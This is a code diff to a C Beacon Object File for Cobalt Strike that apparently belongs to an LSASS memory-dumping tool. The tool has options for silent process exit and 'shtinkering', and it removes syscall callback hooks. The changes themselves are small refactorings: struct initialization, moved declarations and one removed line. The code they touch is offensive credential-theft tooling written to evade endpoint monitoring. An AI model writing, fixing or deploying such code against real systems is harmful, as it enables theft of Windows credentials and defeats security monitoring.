@@ -10,7 +10,7 @@
 
 void go(char* args, int length)
 {
-    dump_context   dc;
+    dump_context   dc = { 0 };
     datap          parser;
     DWORD          lsass_pid;
     LPCSTR         dump_path;
@@ -39,6 +39,8 @@ void go(char* args, int length)
     BOOL           running_as_system = FALSE;
     HANDLE         hImpersonate = NULL;
     UNICODE_STRING full_dump_path;
+    SIZE_T         region_size = 0;
+    PVOID          base_address = NULL;
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
@@ -65,9 +67,6 @@ void go(char* args, int length)
     use_silent_process_exit = (BOOL)BeaconDataInt(&parser);
     silent_process_exit = BeaconDataExtract(&parser, NULL);
     use_lsass_shtinkering = (BOOL)BeaconDataInt(&parser);
-
-    if (!write_dump_to_disk)
-        dump_path = NULL;
 
     remove_syscall_callback_hook();
 
@@ -183,8 +182,8 @@ void go(char* args, int length)
     }
 
     // allocate a chuck of memory to write the dump
-    SIZE_T region_size = DUMP_MAX_SIZE;
-    PVOID base_address = allocate_memory(&region_size);
+    region_size = DUMP_MAX_SIZE;
+    base_address = allocate_memory(&region_size);
     if (!base_address)
         goto cleanup;
 
